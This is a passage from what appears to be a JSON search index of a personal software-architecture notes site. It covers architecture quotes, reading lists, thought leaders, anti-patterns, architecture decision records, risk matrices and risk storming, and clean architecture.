Jaeger, Zipkin) Event Sourcing and CQRS (Command Query Responsibility Segregation): Concepts and benefits Implementation strategies and considerations Containerization \u0026amp; Orchestration: Docker, Kubernetes, and their role in integration Service discovery and scaling in microservices environments Integration Testing: Contract testing End-to-end testing strategies Mocking and stubbing external systems Architecture Documentation and Standards: Documenting integration points, flows, and dependencies Establishing and enforcing integration standards and best practices Future Trends \u0026amp; Emerging Technologies: Serverless architectures and their impact on integration Edge computing and integration AI/ML in integration scenarios Case Studies and Real-world Examples: Discussing real-world integration challenges and solutions Lessons learned from successful and failed integrations "},{"id":82,"href":"/software-architecture/nuggets-of-wisdom/","title":"Nuggets of Wisdom","section":"Software Architecture","content":" Nuggets Of Wisdom # When a team builds a system primarily around reuse, they also incur a huge amount of coupling between components.\nSource: Fundamentals of Software Architecture - Chapter 16, p241 When an architect designs a system that favors reuse, they also favor coupling to achieve that reuse, either by inheritance or composition. However; if the architect\u0026rsquo;s goal requires high degrees of decoupling,then they favor duplication over reuse.\nSource: Fundamentals of Software Architecture - Chapter 17, p246 Don\u0026rsquo;t try to find the best design in software architecture; instead, strive for the least worst combination of trade-offs.\nSource: Software Architecture: The Hard Parts - Chapter 1, p2 Data is a precious thing and will last longer than the systems themselves.\nSource: Software Architecture: The Hard Parts - Chapter 1, p4 There are no right or wrong answers in architecture - only trade-offs\nSource: Software Architecture: The Hard Parts - Chapter 2, 30 A second common style of definition for architecture is that it\u0026rsquo;s âthe design decisions that need to be made early in a projectâ, but Ralph complained about this too, saying that it was more like the decisions you wish you could get right early in a project. His conclusion was that âArchitecture is about the important stuff. Whatever that isâ - (Martin fowler) Note that \u0026ldquo;what is important\u0026rdquo; means that (expert) developers decide what is important, a simple webapp, the DB could be important, but for a medical imaging app, a detail.\nThere are no wrong answers in architecture, only expensive ones\nSource: Fundamentals of Software Architecture - Chapter 5, p74 Developers are drawn to complexity like months to a flame, frequently with the same result.\nNeal Ford Since hindsight no longer leads to foresight after a shift in context, a corresponding change in management style may be called for.\nHBR - A leaders framework for decision making Conway\u0026rsquo;s law suggest major gains from designing software architecture and team interactions together, since they are similar forces.\nSource: Team Topologies Book Promote software to a profit center, and demand strategic innovations as the only acceptable result.\nSource: Strategic Monoliths and Microservices - Driving Innovation Using Purposeful Architecture TODO # Nuggets of wisdom list Don\u0026rsquo;t split services/domains on \u0026ldquo;entity\u0026rdquo;, entity driven design I call it. Cause where goes to the entity independent, or aggregate of enttities business logic? Your thoughts on the DRY principle, and using the rule of 3. You want to apply DRY for code that changes at the same time, for the same actor/end user. (e.g. a logic for a user vs admin that seems similar at first). Clean architecture book page 62 v1: A module should be responsible to one, and only one, user ornstakeholder v2 (better): A module should be responsible to one, and only one, actor. Note: module can be a small as a single source file, so maybe it is not really DRY specific, but more a guide. "},{"id":83,"href":"/software-architecture/resources/","title":"Resources","section":"Software Architecture","content":" Resources # Websites # https://www.datamesh-architecture.com/ https://www.developertoarchitect.com/ https://martinfowler.com/architecture/ Azure Architecture Center ByteByteGo Checklist Manifesto Platform Engineering Maturity Model Software Engineering At Google Articles/Blog/Posts/Whitepapers/Tools # Note: I list only Articles/Blog/Posts that I have read and appreciate\nArchitecture Katas Cognitive Load Types Conway Law: Whitepaper How (not) to do event versioning How To Choose Microservice boundaries Who needs an architect? (Martin Fowler) Reactive Manifesto Replicated Data Consistency Explained Through Baseball Saga Pattern Whitepaper Enterprise Architects Join the Team (Rebecca J. Parson) EA in the Lean Enterprise Serverless and Clean Architecture Versioning in Event Driven Architectures (Book) What is Event Modelling Structure Eats Strategy - BAPO Model Recommended Books # Note: I list only books that I have read and appreciate\nBuilding Event-Driven Microservices: Leveraging Organizational Data at Scale Building Evolutionary Architectures Clean Architecture DeviIQ Domain-Driven Design Distilled Elastic Leadership Enterprise Integration Patterns Fundamentals of Software Architecture Managed Evolution Presentation Patterns: Techniques of crafting better presentations Software Architecture: The Hard Parts The Software Architect Elevator A small summary covering some points of the book. Thinking in Systems: A Primer Threat Modeling: Designing for Security Team Topologies "},{"id":84,"href":"/software-architecture/thought-leaders/","title":"Thought Leaders","section":"Software Architecture","content":" Thought Leaders # In alphabetical order\nGregor Hohpe # Website: enterpriseintegrationpatterns.com Author of many books like Enterprise Integration Patterns and The Software Architect Elevator.\nMark Richards # Website: developertoarchitect.com Author of many books like 97 Things Every Software Architect Should Know, Fundamentals of Software Architecture, and Software Architecture: The Hard Parts. He works for the infamous ThoughtWorks which has many thought leaders and relevant authors on its payroll.\nMartin Fowler # Website: martinfowler.com Wiki: https://en.wikipedia.org/wiki/Martin_Fowler_(software_engineer) Author of many books like Patterns of Enterprise Application Architecture, Refactoring: Improving the Design of Existing Code and UML Distilled: A Brief Guide to the Standard Object Modeling Language. He works for the infamous ThoughtWorks which has many thought leaders and relevant authors on its payroll.\nMicheal Nygard # Website: michaelnygard.com Well-known software architect which authored Release IT!.\nNeal Ford # Website: nealford.com Author of many books like Building Evolutionary Architectures, Fundamentals of Software Architecture, and Software Architecture: The Hard Parts. He works for the infamous ThoughtWorks which has many thought leaders and relevant authors on its payroll.\nRobert C. Martin # Website: cleancoder.com Author of many books and mostly known for clean code and design principles. However, regarding architecture, he wrote the excellent piece Clean Architecture.\nSam Newmann # Website: samnewman.io Author of books like Building Microservices and Monolith To Microservices.\nSusanne Kaiser # Website SusanneKaiser.net Does many architecture talks.\nVaughn Vernon # Website: vaughnvernon.com Author of many books like Implementing Domain-Driven Design, Strategic Monoliths and Microservices, and Reactive Messaging Patterns with the Actor Model. In addition to that, he also has a \u0026ldquo;signature series\u0026rdquo; which are all related to software architecture.\nZhamak Dehghani # LinkedIn: Visit Twitter: @zhamakd Author of Fundamentals of Software Architecture and Data Mesh.\n"},{"id":85,"href":"/software-architecture/todo/","title":"Todo","section":"Software Architecture","content":" Topics to cover - AKA THE TODO # What is Software Enterprise Architecture\nHow to get \u0026ldquo;TRUST\u0026rdquo; from the engineering team, and how to measure it (doing surveys for example)\nHow to get architecture in the \u0026ldquo;AGILE\u0026rdquo; or \u0026ldquo;SAFE\u0026rdquo; ecosystem ?\nHow to get architecture adapted all together\nWhere/how does \u0026ldquo;clean Architecture\u0026rdquo; fit in ?\nMake a good split and difference between architecture and enterprise architecture\nConsider on how to discuss the points of Software Architecture and the hard parts book\nConsider how the architect elevator fits the big picture.\nDiscuss managed evolution, but go deeper, what it solves or does. Like, IT allignment. Circle that back to the enterprise architecture and understand how the role of IT is perceived and the relation.\nEmphasize how \u0026lsquo;data\u0026rsquo; and \u0026lsquo;relations/connections impact architecture.\nThe concepts of \u0026ldquo;lenses/views\u0026rdquo; and how they can be used. Which are they, and when to use which ones?\nLook at managed evolution KPIs\nMake a throrough list of fitness function examples\nDomain Events, Event Driven Architecure, Even Sourcing\u0026hellip;\nhttps://martinfowler.com/articles/201701-event-driven.html \u0026ldquo;Emerging design/architecture\u0026rdquo;\nAdd also something about all the database reading models, like eventual consistency and such. Cause this is very important when architecting or designing stuff, and the what you should take in consideration.\nhttps://www.microsoft.com/en-us/research/wp-content/uploads/2011/10/ConsistencyAndBaseballReport.pdf Also see the Data instensive applications Technology radar and application radar\nSAGA Pattern\nChoreography (is basically event driven choreography, while orchestration is more SAGA as you would know it. I would do research if \u0026ldquo;SAGA Choreography\u0026rdquo; is really SAGA all together, read back the original whitepaper to validate.) https://learn.microsoft.com/en-us/azure/architecture/reference-architectures/saga/saga Orchestration Hexagonal Architecture\n\u0026ldquo;. I think that one of an architectâs most important tasks is to remove architecture by finding ways to eliminate irreversibility in software designs.\u0026rdquo; martin fowler\n\u0026ldquo;Software is not limited by physics, like buildings are. It is limited by imagination, by design, by organization. In short, it is limited by properties of people, not by properties of the world. âWe have met the enemy, and he is us.â - ralph johnson\nArchitecture domains/domains/fields\nApplication Architecture Integration Architecture Infrastructure Architecture Architecture over time - patterns # Discuss patterns or techniques which allow to gradually migrate from todays architecture/design to the target architecture/design.\nParallel Run Dark launching Feature toggles Strangler pattern Granualar roll out Feedback channels \u0026hellip; Others # Understanding Needs # To do good architecture, one must really try to understand the needs of all the stakeholders involved, and understand their priorities. All your architectural decisions should be guided by the this.\nComponent Principles # Component Chesion # based on Clean Architecture\nComponent Coupling # based on Clean Architecture\nX is a Detail # based on Clean Architecture\nAdd your thoughts on how this element is relevant in larger architectures, and about microservices , where if the service is small enough, it might be less \u0026ldquo;important\u0026rdquo;. I think it\u0026rsquo;s still relevant, to follow this, but on a smaller scale. Cause it has a solid point to avoid \u0026ldquo;bleeding in\u0026rdquo; of external concepts/ideas/or such. Techniques and Soft Skills # BASE ACID What they mean, and how they related to architectures (monolith vs distributed etc\u0026hellip;) emergent design and intentional architecture Modelling # * Go deeper on domain modelling techniques and approaches. Data # Draw the comparison with your blog on cloud services. Operational vs Anlytical data Data mesh Look at data intensive applications book to see Data vs Application architecture might be a more mainstream approach. Concurrency Models # What is covered in the book 7 databases in 7 weeks # ANy thoughts from there Architecture Katas # The role of patterns in architecture + a list of patterns (might be the parent placeholder for things like the SAGA.) # Secure By Design # Privacy By Design # Technology Radar # Application Radar # Talk about emergent design, usually design emerges from the path of least resistance (technically or from organization, like, which team had the least bandwith or knows the stakeholder best?, they get to implement features). Also identify what other \u0026ldquo;forces\u0026rdquo; impact systems or emergent design more specific. # ChatGPT input:\nWhen discussing emergent design or architecture in IT systems, especially in the absence of intentional design, several forces or \u0026ldquo;laws\u0026rdquo; akin to the law of the \u0026ldquo;path of least resistance\u0026rdquo; can be observed. These forces collectively influence the system\u0026rsquo;s evolution and characteristics:\nConway\u0026rsquo;s Law: This principle states that system designs are constrained to mimic the communication structures of the organization that creates them. In other words, the system\u0026rsquo;s architecture will mirror the organizational structure.\nAccidental Complexity: This refers to complexity that arises from the chosen tools, languages, or approaches rather than from the inherent complexity of the system itself. Over time, this accidental complexity can shape the system in unforeseen ways.\nTechnical Debt: As shortcuts are taken or temporary solutions are implemented, technical debt accumulates. This debt can guide future development choices, often leading to more complex and less optimal solutions.\nSurvivorship Bias: The systems or components that endure are often those that are good enough, not necessarily the best. This bias can guide the evolution of a system based on what works adequately under certain conditions, rather than what might be optimal in a different context.\nErosion of Design: Over time, the original design of a system can erode due to multiple incremental changes, leading to a structure that no longer resembles the intended design. This erosion shapes the emergent design.\nResource Limitation: The availability of resources (time, budget, skills) heavily influences system design. Constraints in these areas can lead to simpler, more pragmatic solutions.\nFeedback Loops: The responses and feedback from a system\u0026rsquo;s users or environment can significantly influence its evolution. Positive feedback may lead to the reinforcement of certain features or designs, while negative feedback may prompt changes.\nEvolutionary Design: The system evolves over time through a process of natural selection, where the most successful features or components survive and less successful ones are discarded or modified.\nMarket and User Demand: Market trends and user needs can greatly influence the direction of a system\u0026rsquo;s development, often pushing it in directions not initially anticipated.\nRegulatory and Compliance Forces: Legal and compliance requirements can impose constraints on a system\u0026rsquo;s design, often leading to architectures that prioritize compliance over other aspects.\nThese forces often interact with each other, leading to complex dynamics that shape the emergent design of IT systems. Understanding these forces can help in managing and guiding the evolution of such systems.\nThe list of ten forces shaping emergent IT system design was a curated selection, not an exhaustive one. There are indeed additional factors that can influence system architecture in the absence of intentional design:\nTechnology Lock-In: The initial choice of technology (like a programming language or platform) can constrain future development, leading to a path dependency where changing technologies becomes increasingly difficult and costly.\nSecurity Considerations: Security needs can profoundly shape system architecture, often resulting in trade-offs with usability, performance, or cost.\nScalability Needs: The necessity to scale a system to handle increased load can lead to significant architectural changes, often emphasizing distributed systems, cloud computing, or microservices.\nLegacy Systems Integration: The need to integrate with or build upon legacy systems can significantly influence architecture, often leading to more complex and less ideal solutions.\nPerformance Optimization: The drive to optimize for performance can lead to specific architectural choices, such as the use of certain algorithms, data structures, or hardware optimizations.\nCultural and Social Factors: The cultural and social context in which a system is developed can subtly influence design choices, especially in terms of user interface and experience.\nEnvironmental Impact and Sustainability: Increasingly, considerations about a system\u0026rsquo;s environmental impact and sustainability can influence architectural decisions, such as energy-efficient computing or reduced electronic waste.\nKnowledge and Experience of the Development Team: The collective knowledge, experience, and biases of the development team can greatly influence the architecture, often leading to a preference for familiar technologies and patterns.\nData Gravity: The concept that data and applications tend to move towards the largest data pools. Large datasets can influence the architecture by necessitating processing and analytics to be close to where the data resides.\nUser Feedback and Behavior: The way users interact with a system and their feedback can lead to iterative changes in the system, shaping its design over time.\nThese additional forces, along with the initial ten, highlight the multifaceted and complex nature of system design in IT, especially when there\u0026rsquo;s no intentional architecture or design in place. The emergent design is often a product of these varied, sometimes conflicting, influences.\n"},{"id":86,"href":"/software-architecture/topics/anti-patterns/","title":"Anti Patterns","section":"Software Architecture","content":" General Anti-Patterns # A general set of anti-patterns that might not immediately find place or belong to a specific topic.\nAnti-Pattern: Architecture By Implication # Developers make design decisions implicitly rather than explicitly, which can lead to a poorly defined and chaotic architecture. This anti-pattern often emerges when teams lack experience, proper communication, or sufficient design documentation, causing developers to assume that their colleagues share their understanding of the system\u0026rsquo;s design.\nAnti-Pattern: Distributed Monolith # A distributed monolith is the result of splitting a monolith into multiple services, that are heavily dependent on each other, without adopting the patterns needed for distributed systems. In practice, it\u0026rsquo;s the result of splitting a monolith into separate services, but keeping them tightly coupled. That means, they still rely heavily on each other. In this context, you lose the simplicity that comes with a monolithic architecture, but don\u0026rsquo;t enjoy the benefits of independent microservices.\nSource\nAnti-Pattern: Entity Trap # The architect takes each entity identified in the requirements and does almost a 1:1 mapping between each component and entity (e.g. AuctionManager, ItemManager, BidManager). This is not architecture, but component-relational mapping of a framework to a database. This anti-pattern arises when an architect incorrectly identifies the database relationships as workflows in the application, a correspondence that rarely manifests in the real world.\nAnti-Pattern: Frozen Cavemen # An architect who always reverts back to their pet irrational concern for every architecture. Manifests in architects who have been burned in the past by a poor decision or unexpected occurrence, making them particularly cautious in the future. Risk assessment is important, but should be realistic as well.\nResources # DeviIQ Anti-patterns TODO # Accident Architecture (Anti Pattern) "},{"id":87,"href":"/software-architecture/topics/architectural-thinking/","title":"Architectural Thinking","section":"Software Architecture","content":" Architectural Thinking # An architect sees things differently from a developer. Like a meteorologist might see clouds different from an artists point of view. Many architects believe that architectural thinking is simply \u0026ldquo;thinking about architecture\u0026rdquo;, but its more.\nThere are 4 main aspects of thinking like an architect: Architecture vs Design, Technical breadth vs Depth, Analyzing Trade-offs, and Understanding Business Drivers.\nArchitecture vs Design # Software architecture refers to the high-level structuring of a software system, outlining the system\u0026rsquo;s main components, their relationships, and their interactions, serving as a blueprint for the system. Software design, on the other hand, delves deeper into the details, focusing on the realization of that architecture by specifying how each component or module will function, including algorithms, data structures, and interfaces, to achieve the system\u0026rsquo;s overall objectives. While architecture provides a holistic view and establishes the foundational framework, design is concerned with the nitty-gritty aspects that bring this framework to life. That\u0026rsquo;s why there are \u0026ldquo;Architectural Decisions\u0026rdquo; and \u0026ldquo;Designing Guidelines\u0026rdquo;. Architects makes decisions about the architecture, but will only give \u0026ldquo;guidance\u0026rdquo; or \u0026ldquo;advise\u0026rdquo; or design level, where the developer can take their own decisions.\nTo make architecture work, both the physical and virtual barriers between architects and developers must be broken down. Allowing for a bidirectional relationship.\nSee Traditional Relationship Diagram See Bidirectional Relationship Diagram Technical breath vs depth # Unlike developers, architects need technical breath, not depth. Developers meed more depth, less breath. Architects must make decisions that match capabilities to technical constraints, a broad understanding of a wide variety of solutions is valuable.\nAs many developers evolve into the architect role, they will face the some challenges:\nThe architect tries to maintain expertise in wide variety of areas. The architect has stale expertise, the mistaken sensation that your outdated information is still cutting edge. Once transitioning into the architecture role, may have to change the way they view knowledge acquisition. But it\u0026rsquo;s also about properly balancing. You must maintain some level of technical depth.\nSee Knowledge Pyramid Diagram See Knowledge Pyramid Anti-Pattern Diagram Analyzing Trade-Offs # Everything in architecture is a trade-off. So you need to make a trade-off analysis for every solution that you consider. Being able to understand which is the most optimal trade-off for your goals is key. Cause all solutions starts with \u0026ldquo;it depends\u0026rdquo;, there are not cookie-cut solutions that fit all, or best practices, analyzing trade-offs are the best approach to compare and decide on a various set of solutions.\nThere are no right or wrong answers in architecture - only trade-offs\nUnderstanding Business Drivers # Understanding the business drivers tha are required for the success of the system and translating those requirements int architecture characteristics (which allows you to do trade-off analysis). This requires the architect to have some level of business domain knowledge and healthy, collaborative relationships with key business stakeholders.\nBalancing Architecture and Hands-On Coding # A software architect ideally codes to maintain a certain level of technical depth. Therefore is is advised to do hands-on coding if possible. However, some tips are in place to achieve this:\nDon\u0026rsquo;t take ownership of code within the critical path of the project, cause you might become the bottleneck, as you got many other responsibilities, so don\u0026rsquo;t become the bottleneck. Consider doing frequent proof-of-concepts. Consider making it production quality, as often POCs go straight in production (unfortunately, might as wel prepare for this). Consider tackling technical debit or architecture stories. Consider working on bug fixes. Consider helping to optimize how developers work, with tools, automation, creating fitness functions, and such. Consider doing frequent code reviews. Resources # Fundamentals of Software Architecture - Chapter 2 "},{"id":88,"href":"/software-architecture/topics/architecture-decisions/","title":"Architecture Decisions","section":"Software Architecture","content":" Architecture Decisions # Architecture decisions describe the rules for how a system should be constructed. These rules form the constraints of the system and informs the developers on what they can and cannot do.\nMaking architecture decisions involves gathering enough relevant information, justifying the decision, documenting the decision, and effectively communicating that decision to the right stakeholder.\nArchitectural decisions are about:\nMaking the right trade-offs for your system. There is no perfect architecture, so we need to be explicit and conscious about which trade-offs we make. It\u0026rsquo;s about Fit For Purpose. Note that the Software Architecture: The Hard Parts books uses the following subtitle: Modern Trade-Off analyses for Distributed Architectures.\nKeeping your options open of your system in the future. Try to minimize the number of early and irreversible decisions. What we do is \u0026ldquo;defer\u0026rdquo; as many decisions as possible. When talking to business you could compare these \u0026ldquo;deferred decisions\u0026rdquo; to \u0026ldquo;options\u0026rdquo; in the finance. Examples: Choosing a platform agnostic programming language, allow for horizontal scaling so the sizing decisions can be postponed (elasticity). As Gregor Hohpe puts it: Architecture is about selling options. Architecture Decisions Example Image\nArchitecture Decision Anti-Patterns # As everywhere, anti-patterns tend to emerge. For architecture decisions, that\u0026rsquo;s no different.\nWhen making decisions the Covering your Assets anti-pattern usually occurs, overcoming this anti-pattern usually results in the Groundhog Day anti-pattern. Overcoming that anti-pattern leads to the Email-Driven Architecture anti-pattern. As an architect you need to overcome all 3 of these anti-patterns.\nAnti-Pattern: Covering your Assets # Cause # When an architects avoids or defers making an architecture decision out of fear of making the wrong choice.\nSolution # Wait until the last responsible moment to make an important architecture decision. This means waiting until you have enough information to justify and validate your decision, but not waiting so long that you hold up development teams or fall into the Analysis Paralysis anti-pattern. Continually collaborate with development teams to ensure that the decision you made can be implemented as expected. Anti-Pattern: Groundhog Day # Cause # When people don\u0026rsquo;t know why a decision was made, so it keeps getting discussed over and over and over. This is because once an architect makes an architecture decision, they fail to provide a justification for the decision (or a complete justification).\nSolution # Provide both technical and business justifications for your decision. If a particular architecture decision does not provide any business value, then perhaps it is not a good decision and should be reconsidered. Most common business justifications include cost, time to market, user satisfaction, and strategic positioning. Take in consideration what is important for your stakeholder, maybe cost is less of a concern than time to market. Anti-Pattern: Email-Driven Architecture # Cause # Email is great for communicating, but is a poor document repository system.\nSolution # Do not include the architectural decision in the body of an email. Mention only the nature and the context of your decision in the body of the email and link to the system of record. Only notify people who care about the architectural decision. Hi Ian, an important decision regarding the architectural style was made that directly impacts you. Please see confluence page\u0026hellip;link\nTechnical Decisions # In general, technical decisions don\u0026rsquo;t contain technological decisions. However, this is not always the case. If a specific technology is chosen because it directly supports a specific architectural characteristic, then it\u0026rsquo;s an architecture decision.\nArchitectural Decision Records (ADR) # One of the most effective ways of documenting architecture decisions. Evangelized by Michael Nygard in a blog post.\nBasic Structure # Title: Number + Short description stating the architecture decision. The numbering allows for easy reference. Status: State of the ADR Status Types: [Optional] RFC: Request for comments/feedback, advised is to set a deadline to avoid analysis paralysis Proposed: Awaiting final approval Accepted: Approved and ready for implementation Superseded: Decision has been changed and superseded by another ADR. Powerful way to keep historical record of what decisions were made. It should point to the ADR/Decision it was superseded by. Rules around status change can set who is allowed to approve what, based on cost, cross-team impact, and security. Based on the organization structure and who has a say in these factors, one can define who is allowed to approve decisions based on their impact. Context: What situation is forcing me to make this decision? Described the specific situation or issue and concisely elaborate on the possible alternatives. If required to document the analysis of each alternative in detail, consider adding an Alternatives section. [Optional] Alternatives: When desired, all the considered alternative solutions can be documented. Decision: The architecture decision + the full (technical and business) justification for that decision. A affirmative, demanding voice is advised (e.g. \u0026ldquo;We will use\u0026hellip;\u0026rdquo;). Emphasize on WHY the decision is made. Consequences: Document the overall impact of an architecture decision, good and bad. This should document the trade-off analysis associated with given decisions. This trade-off can be cost-based or against other architecture characteristics. It is important that we are explicit and understanding which trade-offs we make, making clear which concerns are more important than to others. [Optional] Compliance: Forces the architect to think about how the architecture decision will be measured and governed from a compliance perspective. Should this be a manual compliance check or can this be automated with a fitness function. The architect can document how this decision is enforced, if possible. [Optional] Notes: Original Author Approval Date Approved By Superseded date Last modified date Modified By Store ADRs # Based on the scope you should store these ADRs appropriately. You can store them in a git repo, close to the source, if the ADRs are scoped to everything that is located in that git repo. Alternatively, on larger scopes, consider shared folders (e.g. OneDrive) or CMS\u0026rsquo;s.\nExceptions # An exception can be also named \u0026ldquo;a variance\u0026rdquo;.\nThere can be always a need for exceptions on any architectural decisions or rules. That is ok, this will always happen. However, you want to track and document these exceptions. See it as a \u0026ldquo;permit\u0026rdquo; to break a rule, that ideally must be explicitly approved. By documenting exceptions, one can track the why of the approval of the exception. If one would track the amount of exceptions, you can create more insight regarding your architectural decisions. Many exceptions can indicate that their might be issues with the existing rules/decisions. No exceptions can indicate that the rules/decisions are not relevant maybe or don\u0026rsquo;t touch important subjects. As always, one would like to see a balance.\nResources # GitHub ADR Fundamentals of Software Architecture - Chapter 19 ADR-Tools ADR-Tools Blog "},{"id":89,"href":"/software-architecture/topics/architecture-risk/","title":"Architecture Risk","section":"Software Architecture","content":" Architecture Risk # Every architecture has risk associated with it. Analyzing risk is one of the key activities of architecture. By analyzing risk, the architect can address deficiencies within the architecture and take corrective action to mitigate the risk.\nRisk Matrix # When assessing architecture risk it\u0026rsquo;s hard and fairly subjective to qualify a risk as low, medium, or high. The risk matrix can be leverages to reduce the level of subjectiveness.\nThe architecture risk matrix uses 2 dimensions to qualify risk: the overall impact of the risk and the likelihood of that risk occurring. Each dimension can be qualified as low (1), medium (2), or high (3). These numbers are multiplied together within each grid of the matrix, providing an objective numerical representation of that risk.\nRisk 1 - 2 : Low Risk (green) Risk 3 - 4 : Medium Risk (yellow) Risk 6 - 9 : High Risk (red) TIP: Considering to start first with the \u0026ldquo;overall impact\u0026rdquo; dimension before rating the likelihood.\nMatrix # Overall Impact / Likelihood Of Risk Low (1) Medium (2) High (3) Low (1) 1 (green) 2 (green) 3 (yellow) Medium (2) 2 (green) 4 (yellow) 6 (red) High (3) 3 (yellow) 6 (red) 9 (red) Colored Risk Matrix\nExample # There is a concern about availability with regard to a primary central database used in the application:\nOverall Impact: Loosing the databases has a high impact if the application needs the database to do anything. Likelihood Of Risk: If the database is Highly Available in a cluster configuration, then there is a low likelihood of risk. Overall Risk Rating: High (3) * Low (1) = 3 (Medium Risk) Risk Assessments # Given that we have the risk matrix to help grade risk, we can make a summarized report of the overall risk of an architecture. That is what we call a risk assessment.\nRisk Criteria Customer Registration Catalog Checkout Order Fulfillment Order Shipment Total Risk Scalability 2 6 1 2 11 Availability 2 4 2 1 10 Performance 4 2 3 6 15 Security 6 3 1 1 11 Data Integrity 9 6 1 1 17 Total Risk 24 21 8 11 Such a Risk Assessments allows to find critical areas that need attention and prioritize accordingly, by looking at the risk by domain or criteria. Based on the business and domain, certain criteria or domains will have priority over the others (e.g Checkout might be considered the most critical for some businesses).\nRisk assessments should be done periodically, as these are not static factors. Measure them over time and track the trends of the values. Annual risk assessments are a good starting point.\nVisual Variations for better story telling # Risk Assessment - Normal Risk Assessment - Highlighting high risk Risk Assessment - Direction of risk with +/- symbols Risk Assessment - Direction of risk with arrows and numbers ISO 27001 \u0026amp; Security # Doing risk assessments is considered a best practice for security. The ISO 27001 information security standard has one of its central tenets the process of doing periodical risk assessment.\nIdentifying Risk # There are various methods to identify and address risks in your architecture.\nThreat Modeling Risk Storming Definition - Systematic Process- Can be done collaborative but emphasize is on the process. - Collaborative Technique Participants Usually security experts Various stakeholders, from developers to business analysts to users Scope Primarily focused on security threats Looks at a broader rang of risk, which can include security, but also usability, performance, compliance, and other concerns. Output Typically results in a list of potential threats, their severity, and suggested mitigation strategies. Outputs not only a list of risks but also a prioritized set of actions based on the collaborative discussions. Notes Strong security emphasize Might also result in a better understanding of business priorities, user concerns, and technical constraints. Threat Modeling deserves its own place, so we will cover here only Risk Storming.\nAddressing Risk # Once risks/threats are identified with their respective risk rating, identified risks can be addressed in various ways:\nAvoid Risk: Stop doing the activity that causes the risk. Example: Delete the web server if it\u0026rsquo;s not used anymore. Mitigate Risk: Implement controls or measures to reduce impact or likelihood. Example: Move a database to a High Available cluster configuration. Transfer Risk: Transfer the risk to a 3th party. Example: Buy insurance, outsource activity, \u0026hellip; When using Azure, you transfer any risk regarding physical server security to Azure. Accept Risk: We don\u0026rsquo;t do anything, and accept consciously this risk. Usually when measures/controls would outweigh the risk. Or the risk is just too low. Example: The risk rating is to low Example: Special software would cost $100 000, while your company has revenue of $20 000. Risk Storming # Risk storming is a collaborative exercise used to determine architectural risk within a specific dimension. Common dimensions (areas of risk) include unproven technology, performance, scalability, availability (including transitive dependencies), data loss, single points of failure, and security. Risk storming efforts include architects, senior developers, and tech leads. Providing an implementation perspective for architects, but also for non-architects to gain a better understanding of the architecture.\nRisk storming involves an individual part and a collaborative part. An architecture diagram is used for both parts. Based on the scope of the risk storming (entire architecture or a specific context) appropriate architecture diagram should be provided.\nStep 1: Identification (individual) # Each participant identifies areas of risk within the architecture on their own. This is essential so that other participants don\u0026rsquo;t influence each other or direct attention away. This should be done ahead of time before the collaborative part starts. This preparation can be done with a risk per post-it, which is color-coded based on the overall risk rating (e.g. High - red). This means that each participant must rate each risk using the risk matrix ahead of time.\nStep 2: Consensus (collaborative) # The goal is gaining consensus among all participants in a meeting regarding the risk within the architecture. Ideally the architecture diagram is printed or visible on a large screen and at the start of the session, all participants put their post-its on the diagram, based on where they identified the risks.\nOnce all post-its in place, the collaborative part on gaining consensus in terms of the risk qualification. All post-its should be covered.\nStep 3: Mitigation (collaborative) # Now risks must be addressed, some will be mitigated, others might not, see Addressing Risk about what options exist. Key (business) stakeholders should be involved on deciding how risks are addressed as they are usually best positioned to decide on accepting risk or accepting costs to mitigate a risk.\nExample: Risk Storming # Example: Complete Risk Assessment Table # ID Risk Overall Impact Likelihood Rating Address Notes 001 Database becomes unavailable High Medium High Mitigate Risk Configure Database as HA with cluster configuration 002 Hardware accessed by unauthorized person High Medium High Transfer Risk Azure is responsible for hardware security \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip;. \u0026hellip; \u0026hellip; Resources # Fundamentals of Software Architecture - Chapter 20 - Contains Risk Story Examples ISO 27001: Information Security "},{"id":90,"href":"/software-architecture/topics/best-practices/","title":"Best Practices","section":"Software Architecture","content":" Best Practices # Almost everything you do as an architect is unique for your given context, situation, organizational priorities and such. Therefore best practices on how to solve a specific situation are non-existing or unrealistic.\nHowever, a good methodology on applying a trade-off analysis allows you to find answers to your specific situation.\n"},{"id":91,"href":"/software-architecture/topics/clean-architecture/","title":"Clean Architecture","section":"Software Architecture","content":" Clean Architecture # General Overview # Clean architecture was created by Robert C. Martin. The general idea is that any type of architecture should respect the rights direction of the dependencies, see the Dependency Rule.\nThe core, the entities is the purest part of the system with 0 impurity. The more we move to outer layers, the more impure the layers become, note that functional programming languages tend to encourage this idea.\nFor more on how functional programming encourages clean architectures styles, watch the talk from Mark Seemann \u0026ldquo;Functional Architecture - The Pits of Success\u0026rdquo; on YouTube.\nNotice that most of the rules of the architecture emerge from the SOLID principles, translated in their module level equivalents. More on that later.\nDependency Rule # Source code dependencies must point only inward, toward higher level policies.\nMeaning, the inner modules must be be unaware and not depend on outer layers of the architecture. The outer layers must \u0026ldquo;plug in\u0026rdquo; into the inner layers. So think, plugin approach. By respecting these rules, any changes on the outer layers have 0 impact on inner layers.\nUsing the Dependency Inversion principle helps to achieve this. E.g. if a use cases must call an external service, it should use an interface. The outer layer that access the external service should then implement this interface. Notice that this enforces the outer layer to depend on the inner layer, not the other way around. The inner layers are more abstract, the more you move outwards, things become more concrete and \u0026ldquo;implementation details\u0026rdquo;.\nMoving data across the layers should be only simple data structures, known as DTOs.\nEntities # This encapsulates enterprise wide business rules. This can be objects with methods, set of data structures and functions. Here we want all the high level rules set in stone so to say. Operational changes for example should have 0 impact on the entities.\nUse Cases # This layer contains application-specific business rules. Here we implement all the use cases of the system. Notice the location on the overview, that the Use Case layer orchestrates the flow from and to the entities layer, using the business rules to achieve the goals of use cases.\nChanges to the UI/DB and any common frameworks should have also 0 impact on this layer.\nHere we implement the actual use cases of the system., so what the application actually tries to do, achieve, automate, reach.\nUse cases can have a sort of \u0026ldquo;business logic\u0026rdquo; but that\u0026rsquo;s decided for the application, so the application is to expected to adhere to some rules, but the core business rules have nothing to do with this.\ne.g. Show first screen x before continuing with step y. This has nothing to do with the core business logic and rules. Or you can not create the loan till all personal data is verified. This is what we mean with \u0026ldquo;application specific\u0026rdquo;. This describes how a automated system is used.\nInterface Adapters # Set of adapters that converts data from the format most convenient for the use cases to the most convenient data format for some external part, like the DB and the web. The MVC architecture of a GUI would go here.\ne.g. Presenters, views, controllers and Models.\nThe awareness of what database is uses should end in this layer and not go to any deeper circle.\nWhen using other external services, again, here the transformation/mapping takes place.\nFrameworks and Drivers # This is more glue code, as we use here often external libraries or services. We convert data from some external form to the internal form used by the use cases and entities.\nWhat is architecture? # The strategy behind the facilitation is to leave as many options open as possible, for as long as possible. Must support Use 